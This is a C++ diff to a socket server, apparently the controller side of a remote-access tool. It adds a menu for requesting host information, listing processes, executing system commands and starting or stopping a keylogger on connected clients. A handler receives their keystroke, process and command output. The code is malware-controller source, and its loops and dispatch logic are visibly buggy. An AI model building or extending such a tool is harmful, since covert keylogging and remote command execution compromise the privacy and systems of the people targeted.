@@ -53,10 +53,7 @@ void LPTF_Server::handleClient(LPTF_Socket &clientSocket)
     try
     {
         LPTF_Packet packet = LPTF_Packet::deserialize(data);
-        string message(packet.getPayload().begin(), packet.getPayload().end());
-        cout << "[CLIENT " << clientSocket.get_fd() << " MSG] : " << message << endl;
-
-        sendPacketToClient(clientSocket, message, CommandType::SEND_MESSAGE);
+        handleCommand(packet);
     }
     catch (const exception &e)
     {
@@ -186,11 +183,16 @@ void LPTF_Server::handleAdminInput()
     if (_kbhit())
     {
         int input;
-        cout << "\n[SERVER MENU] list/send/quit): \n"
+        cout << "\n===== MENU =====\n"
              << "1. list - List connected clients\n"
              << "2. send - Send a message to a client\n"
-             << "3. quit - Quit the server\n"
-             << endl;
+             << "3. Return system information (hostname, username, OS)\n"
+             << "4. List running processes\n"
+             << "5. Execute a system command \n"
+             << "6. Start keylogger\n"
+             << "7. Stop keylogger\n"
+             << "8. quit - Quit the server \n\n"
+             << ">> Choose an option: ";
         cin >> input;
         if (cin.fail())
         {
@@ -200,52 +202,94 @@ void LPTF_Server::handleAdminInput()
             return;
         }
 
-        switch (input)
-        {
-        case 1:
-        {
-            cout << "Connected clients:\n";
-            for (auto *client : clientSockets)
+        for (auto *client : clientSockets){
+            switch (input)
             {
-                cout << "- fd: " << client->get_fd() << "\n";
-            }
-            break;
-        }
-        case 2:
-        {
-            cout << "Enter client fd: ";
-            string sfd;
-            getline(cin, sfd);
-            SOCKET target_fd = static_cast<SOCKET>(stoi(sfd));
-
-            cout << "Enter message to send: ";
-            string msg;
-            getline(cin, msg);
-
-            for (auto *client : clientSockets)
-            {
-                if (client->get_fd() == target_fd)
+                case 1:
                 {
+                    cout << "Connected clients:\n";
+                    cout << "- fd: " << client->get_fd() << "\n";
+                    break;
+                }
+                case 2:
+                {
+                    cout << "Enter message to send: ";
+                    string msg;
+                    getline(cin, msg);
                     LPTF_Packet packet(0x01, vector<uint8_t>(msg.begin(), msg.end()));
                     auto serialized = packet.serialize();
                     client->sendAll(serialized.data(), serialized.size());
-                    cout << "[SERVER] Sent to client " << target_fd << "\n";
+                    break;
+                }
+                case 3:
+                {
+                    sendPacketToClient(*client, "> Requesting host info", CommandType::HOST_INFO_REQUEST);
+                    break;
+                }
+                case 8:
+                {
+                    cout << "Shutting down server...\n";
+                    exit(0);
+                    break;
+                }
+                default:
+                {
+                    cout << "[SERVER MENU] Unknown command.\n";
                     break;
                 }
             }
-            break;
-        }
-        case 3:
-        {
-            cout << "Shutting down server...\n";
-            exit(0);
-            break;
-        }
-        default:
-        {
-            cout << "[SERVER MENU] Unknown command.\n";
-            break;
-        }
         }
     }
 }
+
+void LPTF_Server::handleCommand(const LPTF_Packet& packet)
+{
+    string data(packet.getPayload().begin(), packet.getPayload().end());
+    CommandType type = static_cast<CommandType>(packet.getType());
+
+    for (auto *client : clientSockets) {
+
+        switch (type)
+        {
+            case CommandType::HOST_INFO_RESPONSE:
+            {
+                cout << data << endl;
+                break;
+            }
+
+            case CommandType::KEY_LOG_DATA_RESPONSE:
+            {
+                cout << "[Client] : Starting keylogger..." << endl;
+                break;
+            }
+
+            case CommandType::LIST_PROCESSES_REQUEST:
+
+            {
+                cout << data << endl;
+                break;
+            }
+
+            case CommandType::COMMAND_RESULT_RESPONSE:
+            {
+                cout << data << endl;
+                break;
+            }
+
+            case CommandType::SEND_MESSAGE:
+            {
+                sendPacketToClient(*client, data, CommandType::SEND_MESSAGE);
+
+                break;
+            }
+            default:
+            {
+                cerr << "[Client] : Unknown command type received: " << static_cast<int>(packet.getType()) << endl;
+                break;
+            }
+        }
+    }
+}
+
+
+
